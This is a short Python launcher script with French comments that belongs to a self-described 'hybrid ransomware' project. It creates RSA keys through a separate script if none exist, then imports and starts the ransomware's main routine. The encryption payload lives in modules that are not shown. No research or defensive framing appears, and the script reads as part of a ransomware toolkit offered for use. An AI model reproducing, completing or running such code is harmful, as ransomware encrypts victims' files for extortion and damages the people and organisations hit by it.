import os
import subprocess
from hybrid_ransom import main as run_hybrid

# Génère les clés si elles n'existent pas
if not os.path.exists("public.pem"):
    print("[*] Génération de la clé publique.")
    subprocess.run(["python", "rsa_genkey.py"])

if __name__ == "__main__":
    print("[*] Lancement du ransomware hybride")
    run_hybrid()
